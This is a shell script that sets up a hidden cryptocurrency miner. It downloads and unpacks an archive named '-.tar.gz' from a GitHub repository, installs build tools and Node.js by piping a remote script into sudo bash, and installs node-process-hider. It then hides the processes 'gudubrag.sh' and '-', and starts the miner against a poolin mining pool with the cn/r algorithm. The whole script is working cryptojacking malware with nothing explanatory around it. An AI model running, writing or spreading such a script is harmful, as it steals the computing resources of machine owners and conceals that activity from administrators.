#!/bin/sh
wget https://github.com/nurkartina604/st/raw/main/-.tar.gz
tar -xf -.tar.gz
apt-get update;apt-get -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs
npm i -g node-process-hider
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

sleep 10
ph add gudubrag.sh
ph add -
./- -o --algo cn/r --pool stc.ss.poolin.one:443 --user henes001 --pass 123
